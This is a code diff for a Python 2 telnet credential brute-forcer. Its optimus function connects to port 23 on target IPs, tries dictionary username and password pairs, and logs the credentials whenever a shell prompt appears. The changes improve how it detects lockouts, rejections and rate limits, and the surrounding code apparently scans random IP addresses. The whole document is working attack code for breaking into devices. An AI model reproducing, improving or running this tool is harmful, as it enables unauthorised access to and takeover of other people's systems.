@@ -284,14 +284,29 @@ def prompt_shell(data):
 
 
 def prompt_block(data):
-    if "block" in data:
+    if "refused" in data:
+        return True
+    if "lock" in data:
+        return True
+    if "rejected" in data:
+        return True
+    if "eject the connection" in data:
         return True
     return False
+
+
+def prompt_limit(data):
+    if "limit" in data:
+        return True
+    return False
+
 
 def prompt_login_failed(data):
     if "ncorrect" in data:
         return True
     if "ailed" in data:
+        return True
+    if "nvalid" in data:
         return True
     return False
 
@@ -301,20 +316,30 @@ def optimus(ip):
         sys.exit(1)
     logging.debug("O: " + ip)
     print "try ", ip
-    tried = 0
     i = 0
     for key in dic:
         values = dic[key]
         while i < len(values):
+            tried = 0
             just_prompted_IAC = False
+            prompted_login = False
+            prompted_password = False
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, 23))
                 s.settimeout(60)
-                print key, values[i]
+                data = None
                 while True:
+                    pre_data = data
                     data = s.recv(4096)
                     if not data:
+                        if not pre_data:
+                            if tried > 1:
+                                logging.error("CLOSE: " + ip)
+                                sys.exit(1)
+                            tried += 1
+                            time.sleep(5)
+                            continue
                         break
                     else:
                         if prompt_IAC(data):
@@ -324,6 +349,9 @@ def optimus(ip):
                         elif prompt_login_failed(data):
                             break
                         elif prompt_login(data):
+                            if prompted_login:
+                                break
+                            prompted_login = True
                             just_prompted_IAC = False
                             s.send(key + "\r\n")
                             continue
@@ -331,6 +359,9 @@ def optimus(ip):
                             just_prompted_IAC = False
                             continue
                         elif prompt_password(data):
+                            if prompted_password:
+                                break
+                            prompted_password = True
                             just_prompted_IAC = False
                             s.send(values[i] + "\r\n")
                             continue
@@ -338,22 +369,24 @@ def optimus(ip):
                             just_prompted_IAC = False
                             continue
                         elif prompt_shell(data):
+                            print data
                             logging.info(key + ":" + values[i] + "@" + ip)
                             sys.exit(1)
                         elif prompt_block(data):
-                            logging.debug("BLOCK: " + ip)
+                            logging.error("BLOCK: " + ip)
+                            sys.exit(1)
+                        elif prompt_limit(data):
+                            logging.error("LIMIT: " + ip)
                             sys.exit(1)
                         elif just_prompted_IAC:
                             continue
                         else:
-                            break
+                            continue
                 i += 1
-            except:
-                if tried > 1:
-                    sys.exit(1)
-                tried += 1
-                i -= 1
-                time.sleep(5)
+            except Exception:
+                logging.error("CLOSE: " + ip)
+                sys.exit(1)
+    logging.info("SEC: " + ip)
 
 
 def scan_random_ip(maxThreadNum):
